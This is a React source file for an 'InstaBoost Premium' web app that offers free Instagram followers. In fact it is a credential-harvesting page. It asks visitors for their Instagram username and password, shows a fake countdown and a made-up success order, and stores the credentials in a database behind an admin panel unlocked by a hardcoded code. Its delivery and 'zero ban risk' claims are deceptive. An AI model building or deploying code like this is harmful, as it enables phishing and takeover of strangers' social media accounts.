/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

import React, { useState, useEffect, useCallback } from 'react';
import { Header } from './components/Header';
import { GrowthForm } from './components/GrowthForm';
import { FollowerSelectionModal } from './components/FollowerSelectionModal';
import { CountdownModal } from './components/CountdownModal';
import { SuccessModal } from './components/SuccessModal';
import { ChatbotModal } from './components/ChatbotModal';
import { AdminPanel } from './components/AdminPanel';
import { SettingsModal } from './components/SettingsModal';
import { CoinRewardModal } from './components/CoinRewardModal';
import { api, USER_EMAIL } from './services/api';
import { AppSettings, InstagramAccount, AccountStatus } from './types';
import { Sparkles, Shield, Instagram, Users, CheckCircle, Heart, Zap } from 'lucide-react';

export default function App() {
  // App state
  const [settings, setSettings] = useState<AppSettings>({
    admin_code: '805040',
    app_title: 'Grow Your Instagram',
    app_subtitle: 'Get real followers instantly ✨',
    form_title: 'Add Instagram Account',
    form_subtitle: 'अपना Instagram अकाउंट जोड़ें',
    coins_default: 500,
  });

  const [accounts, setAccounts] = useState<InstagramAccount[]>([]);
  const [coins, setCoins] = useState<number>(500);
  const [isAdminUnlocked, setIsAdminUnlocked] = useState<boolean>(false);

  // Workflow modals state
  const [tempUsername, setTempUsername] = useState<string>('');
  const [tempPassword, setTempPassword] = useState<string>('');
  const [selectedFollowers, setSelectedFollowers] = useState<number>(500);
  const [currentOrderId, setCurrentOrderId] = useState<string>('');

  const [isFollowersModalOpen, setIsFollowersModalOpen] = useState(false);
  const [isCountdownOpen, setIsCountdownOpen] = useState(false);
  const [isSuccessModalOpen, setIsSuccessModalOpen] = useState(false);

  // Feature modals state
  const [isChatOpen, setIsChatOpen] = useState(false);
  const [isAdminPanelOpen, setIsAdminPanelOpen] = useState(false);
  const [isSettingsModalOpen, setIsSettingsModalOpen] = useState(false);
  const [isCoinsModalOpen, setIsCoinsModalOpen] = useState(false);

  // Initial load
  const loadInitialData = useCallback(async () => {
    try {
      const fetchedSettings = await api.getSettings();
      setSettings(fetchedSettings);

      const fetchedAccounts = await api.getAccounts();
      setAccounts(fetchedAccounts);

      const userCoins = api.getCoins();
      setCoins(userCoins);

      const adminAuth = api.isAdminAuthenticated();
      setIsAdminUnlocked(adminAuth);
    } catch (err) {
      console.error('Error initializing app state:', err);
    }
  }, []);

  useEffect(() => {
    loadInitialData();
  }, [loadInitialData]);

  // Step 1 & 2: User submits Add Account form
  const handleInitiateAddAccount = (username: string, pass: string) => {
    setTempUsername(username);
    setTempPassword(pass);
    setIsFollowersModalOpen(true);
  };

  // Step 3 & 4: User selects followers and clicks Send
  const handleConfirmSendFollowers = (followersCount: number) => {
    setSelectedFollowers(followersCount);
    setIsFollowersModalOpen(false);
    setIsCountdownOpen(true);
  };

  // Step 5 & 6: 10-second countdown finishes -> save to DB and show Success popup
  const handleCountdownComplete = async () => {
    setIsCountdownOpen(false);

    // Save to database
    try {
      const newAcc = await api.addAccount({
        username: tempUsername,
        password: tempPassword,
        followers_requested: selectedFollowers,
        created_by: USER_EMAIL,
      });

      // Deduct coins if appropriate
      api.deductCoins(Math.min(100, coins));
      setCoins(api.getCoins());

      // Update accounts list
      setAccounts((prev) => [newAcc, ...prev.filter((a) => a.id !== newAcc.id)]);
      setCurrentOrderId(newAcc.id.toUpperCase());
    } catch (err) {
      console.error('Failed to save account to database:', err);
      setCurrentOrderId(`ORD-${Date.now().toString(36).toUpperCase()}`);
    }

    setIsSuccessModalOpen(true);
  };

  // Admin Verification & Actions
  const handleUnlockAdmin = () => {
    setIsAdminUnlocked(true);
    api.setAdminAuthenticated(true);
  };

  const handleOpenAdmin = () => {
    setIsAdminPanelOpen(true);
    setIsChatOpen(false);
  };

  const handleCloseAdmin = () => {
    setIsAdminPanelOpen(false);
  };

  const handleSaveSettings = async (newSettings: AppSettings) => {
    const updated = await api.updateSettings(newSettings);
    setSettings(updated);
  };

  const handleUpdateStatus = async (id: string, status: AccountStatus) => {
    await api.updateAccountStatus(id, status);
    setAccounts((prev) =>
      prev.map((acc) => (acc.id === id ? { ...acc, status } : acc))
    );
  };

  const handleDeleteAccount = async (id: string) => {
    await api.deleteAccount(id);
    setAccounts((prev) => prev.filter((acc) => acc.id !== id));
  };

  const handleRefreshAccounts = async () => {
    const refreshed = await api.getAccounts();
    setAccounts(refreshed);
  };

  const handleAddCoins = (amount: number) => {
    const updated = api.addCoins(amount);
    setCoins(updated);
  };

  // If Admin Panel is open, display full Admin View
  if (isAdminPanelOpen) {
    return (
      <>
        <AdminPanel
          accounts={accounts}
          settings={settings}
          onClose={handleCloseAdmin}
          onOpenSettings={() => setIsSettingsModalOpen(true)}
          onUpdateStatus={handleUpdateStatus}
          onDeleteAccount={handleDeleteAccount}
          onRefresh={handleRefreshAccounts}
        />
        <SettingsModal
          settings={settings}
          isOpen={isSettingsModalOpen}
          onClose={() => setIsSettingsModalOpen(false)}
          onSaveSettings={handleSaveSettings}
        />
      </>
    );
  }

  return (
    <div className="min-h-screen bg-gradient-to-b from-slate-950 via-slate-900 to-purple-950 text-slate-100 flex flex-col justify-between selection:bg-pink-500 selection:text-white">
      {/* Top Navigation */}
      <Header
        coins={coins}
        onOpenChat={() => setIsChatOpen(true)}
        onOpenCoinsModal={() => setIsCoinsModalOpen(true)}
        isAdminUnlocked={isAdminUnlocked}
        onOpenAdmin={handleOpenAdmin}
      />

      {/* Main Content Area */}
      <main className="flex-1 max-w-6xl w-full mx-auto px-4 py-8 sm:py-12 flex flex-col items-center justify-center">
        {/* Growth Form */}
        <GrowthForm
          settings={settings}
          onInitiateAddAccount={handleInitiateAddAccount}
        />

        {/* Feature Highlights Grid */}
        <div className="w-full max-w-4xl mt-12 grid grid-cols-1 md:grid-cols-3 gap-4">
          <div className="p-4 rounded-2xl bg-slate-900/60 border border-purple-500/20 backdrop-blur-md flex items-start gap-3">
            <div className="w-9 h-9 rounded-xl bg-pink-500/15 text-pink-400 flex items-center justify-center shrink-0">
              <Zap className="w-5 h-5" />
            </div>
            <div>
              <h4 className="text-sm font-bold text-white">Instant Safe Delivery</h4>
              <p className="text-xs text-slate-400 mt-0.5">
                Orders dispatch automatically within seconds. Followers arrive steadily within 24 hours.
              </p>
            </div>
          </div>

          <div className="p-4 rounded-2xl bg-slate-900/60 border border-purple-500/20 backdrop-blur-md flex items-start gap-3">
            <div className="w-9 h-9 rounded-xl bg-purple-500/15 text-purple-400 flex items-center justify-center shrink-0">
              <Shield className="w-5 h-5" />
            </div>
            <div>
              <h4 className="text-sm font-bold text-white">Zero Ban Risk Protocol</h4>
              <p className="text-xs text-slate-400 mt-0.5">
                Engineered with compliant organic drip velocity to strictly protect your Instagram profile.
              </p>
            </div>
          </div>

          <div className="p-4 rounded-2xl bg-slate-900/60 border border-purple-500/20 backdrop-blur-md flex items-start gap-3">
            <div className="w-9 h-9 rounded-xl bg-amber-500/15 text-amber-400 flex items-center justify-center shrink-0">
              <Heart className="w-5 h-5" />
            </div>
            <div>
              <h4 className="text-sm font-bold text-white">Active High Retention</h4>
              <p className="text-xs text-slate-400 mt-0.5">
                Real accounts with profiles, bios, and active history backed by 30-day drop protection.
              </p>
            </div>
          </div>
        </div>
      </main>

      {/* Footer */}
      <footer className="w-full border-t border-purple-500/15 bg-slate-950/80 backdrop-blur-md py-6 text-center text-xs text-slate-400">
        <div className="max-w-6xl mx-auto px-4 flex flex-col sm:flex-row items-center justify-between gap-3">
          <div className="flex items-center gap-2">
            <Instagram className="w-4 h-4 text-pink-400" />
            <span className="font-semibold text-slate-200">InstaBoost Premium</span>
            <span className="text-slate-600">•</span>
            <span>All rights reserved</span>
          </div>

          <div className="flex items-center gap-4 text-[11px] text-slate-400">
            <button
              onClick={() => setIsChatOpen(true)}
              className="hover:text-pink-300 transition-colors"
            >
              Support Chatbot
            </button>
            <span>•</span>
            <button
              onClick={() => setIsCoinsModalOpen(true)}
              className="hover:text-amber-300 transition-colors"
            >
              Coins & Rewards
            </button>
            <span>•</span>
            <button
              onClick={() => {
                if (isAdminUnlocked) {
                  handleOpenAdmin();
                } else {
                  setIsChatOpen(true);
                }
              }}
              className="text-purple-400 hover:text-purple-300 transition-colors"
            >
              {isAdminUnlocked ? 'Admin Panel 🚀' : 'Admin Login'}
            </button>
          </div>
        </div>
      </footer>

      {/* Workflow Modals */}
      {isFollowersModalOpen && (
        <FollowerSelectionModal
          username={tempUsername}
          userCoins={coins}
          onClose={() => setIsFollowersModalOpen(false)}
          onConfirmSend={handleConfirmSendFollowers}
        />
      )}

      {isCountdownOpen && (
        <CountdownModal
          username={tempUsername}
          followersCount={selectedFollowers}
          onComplete={handleCountdownComplete}
        />
      )}

      {isSuccessModalOpen && (
        <SuccessModal
          username={tempUsername}
          followersCount={selectedFollowers}
          orderId={currentOrderId}
          onClose={() => setIsSuccessModalOpen(false)}
          onOpenAdmin={handleOpenAdmin}
          isAdminUnlocked={isAdminUnlocked}
        />
      )}

      {/* Feature Modals */}
      <ChatbotModal
        settings={settings}
        isOpen={isChatOpen}
        onClose={() => setIsChatOpen(false)}
        onUnlockAdmin={handleUnlockAdmin}
        onOpenAdmin={handleOpenAdmin}
        isAdminUnlocked={isAdminUnlocked}
      />

      <CoinRewardModal
        isOpen={isCoinsModalOpen}
        coins={coins}
        onClose={() => setIsCoinsModalOpen(false)}
        onAddCoins={handleAddCoins}
      />

      <SettingsModal
        settings={settings}
        isOpen={isSettingsModalOpen}
        onClose={() => setIsSettingsModalOpen(false)}
        onSaveSettings={handleSaveSettings}
      />
    </div>
  );
}
